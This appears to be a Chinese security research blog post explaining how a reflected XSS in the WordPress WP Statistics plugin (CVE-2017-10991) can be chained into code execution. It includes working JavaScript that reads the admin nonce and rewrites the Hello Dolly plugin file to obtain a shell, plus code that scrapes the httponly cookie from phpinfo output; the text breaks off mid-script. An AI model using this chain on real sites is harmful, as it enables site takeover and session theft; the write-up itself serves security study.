## 引子
前段时间我阅读了Sucuri Security的brutelogic的一篇博客以及ppt，对xss有了一些新的理解。
在我们真实场景下遇到xss漏洞的时候，我们常常会使用
来验证站点是否存在漏洞（PoC），为了不触及敏感信息，我们往往不会深入研究XSS的危害程度，很多人都只知道Cross-Site
Scripting（XSS）可以窃取cookie，模拟admin请求，但事实上在复杂环境下，我们可以使用XSS完成复杂的攻击链。
## 测试环境
Wordpress v4.8.0(默认配置)  
UpdraftPlus v1.13.4  
Yoast SEO v5.1  
WP Statistics v12.0.9
以下的所有研究会围绕Wordpress 的 WP Statistics爆出的一个后台反射性xss(CVE-2017-10991)作为基础。
漏洞详情：  
当Wordpress的站点装有版本小于等于v12.0.9的WP Statistics插件时，其中top-referring.php页面中的`rangestart`和`rangeend`参数没有经过任何过滤就输出在页面内，形成了一个xss漏洞。
POC:  
在Firefox浏览器中点击以下链接,就会执行函数`alert(1)`函数
    http://mywordpress.com/wp-admin/admin.php?page=wps_referrers_page&rangeend=123123">
## 什么是XSS？
Cross-site
scripting（XSS）是一种Web端的漏洞，它允许攻击者通过注入html标签以及JavaScript代码进入页面，当用户访问页面时，浏览器就会解析页面，执行相应的恶意代码。
一般来说，我们通常使用XSS漏洞来窃取用户的Cookie，在httponly的站点中，也可能会使用XSS获取用户敏感信息。
我们从一段简单的php包含xss漏洞的demo代码来简单介绍下XSS漏洞。
当我们传入普通的username时候，返回是这样的
当我们插入一些恶意代码的时候
我们插入的
被当作正常的js代码执行了
让我们回到之前的测试环境中
我们可以通过一个漏洞点执行我们想要的js代码。
## 盗取Cookie
在一般的通用cms下呢，为了通用模板的兼容性，cms本身不会使用CSP等其他手段来防护xss漏洞，而是使用自建的过滤函数来处理，在这种情况下，一旦出现xss漏洞，我们就可以直接使用xhr来传输cookie。
简单的demo如下
这里我们可以直接使用xhr来传递cookie，但可惜的是，由于wordpress的身份验证cookie是httponly，我们无法使用简单的`documen.cookie`来获取cookie。
但无情的是，我们可以通过和别的问题配合来解决这个问题。在这之前，我们先来回顾一种在brutelogic的ppt中提到的xss2rce的利用方式。
通过这其中的思路，我们可以在整个wordpress站点中执行我们想要的任何攻击。
## Xss to Rce
在wordpress的后台，有一个编辑插件的功能，通过这个功能，我们可以直接修改后台插件文件夹的任何内容。
而在默认下载的Wordpress中，都会包含Hello Dolly插件，通过修改这个插件内容并启动插件，我们可以执行想要的任何代码。
但在这之前，我们首先要了解一下，wordpress关于csrf的防御机制，在wordpress中引入了`_wpnonce`作为判断请求来源的参数。
在一般涉及到修改更新等操作的时候，会调用`check_admin_referer()`函数来判断传入的wpnonce是否和该操作计算的nonce值相等，后台部分代码如下：
    function wp_verify_nonce( $nonce, $action = -1 ) {
        $nonce = (string) $nonce;
        $user = wp_get_current_user();
        $uid = (int) $user->ID;
        if ( ! $uid ) {
            /**
             * Filters whether the user who generated the nonce is logged out.
             *
             * @since 3.5.0
             *
             * @param int    $uid    ID of the nonce-owning user.
             * @param string $action The nonce action.
             */
            $uid = apply_filters( 'nonce_user_logged_out', $uid, $action );
        }
        if ( empty( $nonce ) ) {
            return false;
        }
        $token = wp_get_session_token();
        $i = wp_nonce_tick();
        // Nonce generated 0-12 hours ago
        $expected = substr( wp_hash( $i . '|' . $action . '|' . $uid . '|' . $token, 'nonce'), -12, 10 );
        if ( hash_equals( $expected, $nonce ) ) {
            return 1;
        }
        // Nonce generated 12-24 hours ago
        $expected = substr( wp_hash( ( $i - 1 ) . '|' . $action . '|' . $uid . '|' . $token, 'nonce' ), -12, 10 );
        if ( hash_equals( $expected, $nonce ) ) {
            return 2;
        }
这其中i参数固定，action参数为不同操作的函数名，uid为当前用户的id，token为当前用户cookie中的第三部分。
也就是说，即便不方便读取，我们也可以使用直接计算的方式来获得wpnonce的值，完成攻击。
这里我们使用从页面中读取wpnonce的方式，nonce在页面中是这样的
代码如下
    url = window.location.href;
    url = url.split('wp-admin')[0];
    p = 'wp-admin/plugin-editor.php?';
    q = 'file=hello.php';
    s = '';
    a = new XMLHttpRequest();
    a.open('GET', url+p+q, 0);
    a.send();
    ss = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + s + '&action=update&file=hello.php';
    b = new XMLHttpRequest();
    b.open('POST', url+p+q, 1);
    b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    b.send(ss);
通过这段js，我们可以向hello.php写入php code。
    http://127.0.0.1/wordpress4.8/wp-content/plugins/hello.php
getshell，如果服务端权限没有做设置，我们可以直接system弹一个shell回来，导致严重的命令执行。
    s = '';
    a = new XMLHttpRequest();
    a.open('GET', url+p+q, 0);
    a.send();
    ss = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + s + '&action=update&file=hello.php';
    b = new XMLHttpRequest();
    b.open('POST', url+p+q, 1);
    b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    b.send(ss);
    // 请求phpinfo
    b.onreadystatechange = function(){
       if (this.readyState == 4) {
            p_url = url + 'wp-content/plugins/hello.php';
            c = new XMLHttpRequest();
            c.open('GET', p_url, 0);
            c.send();
            sss = /HTTP_COOKIE [\w=;% \-\+\s]+<\/td/.exec(c.responseText)
            // 将获取到的cookie传出